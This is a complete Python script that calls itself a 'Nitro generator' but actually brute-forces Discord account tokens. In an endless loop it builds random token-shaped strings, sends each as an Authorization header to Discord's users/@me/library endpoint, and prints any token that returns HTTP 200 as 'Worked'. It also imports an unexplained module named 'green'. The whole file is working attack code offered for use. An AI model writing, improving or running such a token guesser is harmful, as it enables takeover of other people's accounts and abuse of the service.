import random, string, requests, urllib.request, urllib, urllib.parse, colorama, os, base64, threading, green
from colorama import Fore as C
from colorama import Style as S
from random import randint
from threading import Thread
os.system("")

class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    

sample_string = str(random.randint(000000000000000000,999999999999999999))
sample_string_bytes = sample_string.encode("ascii")
base64_bytes = base64.b64encode(sample_string_bytes)
base64_string = base64_bytes.decode("ascii")

def gen():
 return base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))

class NitroGenerator:
	def __init__(self):
		self.codes = []
		self.check()
	
	def check(self):
		while True:
			tk = gen()
			self.codes.append(tk)
			header = {
			"Content-Type": "application/json",
			"Authorization": f"{tk}"
			}
			r = requests.get("https://discordapp.com/api/v6/users/@me/library", headers=header, proxies=urllib.request.getproxies())
			if r.status_code == 200:
				print(style.GREEN + "Worked: " + tk)
			else:
				print(style.RED + "invalid: " + tk)



NitroGenerator()